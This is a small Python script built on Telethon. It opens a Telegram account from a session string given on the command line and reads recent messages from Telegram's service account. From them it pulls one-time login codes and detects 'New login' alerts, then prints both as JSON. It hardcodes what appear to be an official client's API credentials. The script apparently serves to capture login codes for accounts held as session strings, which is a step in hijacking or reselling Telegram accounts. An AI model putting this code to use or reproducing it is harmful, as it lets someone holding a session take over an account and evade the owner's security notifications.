import asyncio
import sys
import json
import re
from telethon import TelegramClient
from telethon.sessions import StringSession

API_ID = 17349
API_HASH = '344583e45741c457fe1862106095a5eb'

async def fetch_otp_and_check_login(session_str):
    try:
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            return {"error": "Session is invalid or expired"}
            
        target_id = 777000
        # Get latest 5 messages to check for both OTP and New Login notification
        messages = await client.get_messages(target_id, limit=5)
        
        if not messages:
            return {"error": "No messages found from Telegram"}
            
        otp_data = None
        new_login_detected = False
        
        for msg in messages:
            text = msg.text
            # Look for OTP (usually 5-6 digits)
            if not otp_data and re.search(r'\b\d{5,6}\b', text):
                otp_data = {
                    "text": text,
                    "date": str(msg.date)
                }
            
            # Look for "New login" notification
            if "New login" in text or "Login notification" in text:
                # Check if the login happened recently (e.g., within last 5 minutes)
                # For simplicity, we just mark if it exists in the latest messages
                new_login_detected = True
        
        return {
            "otp": otp_data,
            "new_login": new_login_detected
        }
    except Exception as e:
        return {"error": str(e)}
    finally:
        try:
            await client.disconnect()
        except:
            pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(json.dumps({"error": "No session string provided"}))
        sys.exit(1)
        
    session_input = sys.argv[1]
    result = asyncio.run(fetch_otp_and_check_login(session_input))
    print(json.dumps(result))
